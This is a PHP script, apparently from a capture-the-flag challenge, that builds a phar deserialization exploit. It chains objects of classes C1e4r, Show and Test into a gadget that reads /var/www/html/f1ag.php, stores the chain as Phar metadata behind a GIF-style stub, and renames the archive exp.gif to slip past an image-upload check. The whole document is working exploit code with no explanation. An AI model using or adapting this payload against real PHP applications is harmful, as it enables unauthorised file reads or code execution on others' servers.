<?php

class C1e4r {
	public $test;
	public $str;
}

class Show {
	public $source;
	public $str;
}
class Test {
	public $params;
}

$t = new Test();
$t->params = ["source" => "/var/www/html/f1ag.php"];
$c = new Show();
$c->str['str'] = $t;
$x = new C1e4r();
$x->str = $c;
$p = new Phar('./exp.phar', 0);
$p->startBuffering();
$p->setStub('V<?php __HALT_COMPILER(); ? >');
$p->setMetadata($x);
$p->addFromString('v.php', 'yulige');
$p->stopBuffering();
copy('./exp.phar', './exp.gif');
?>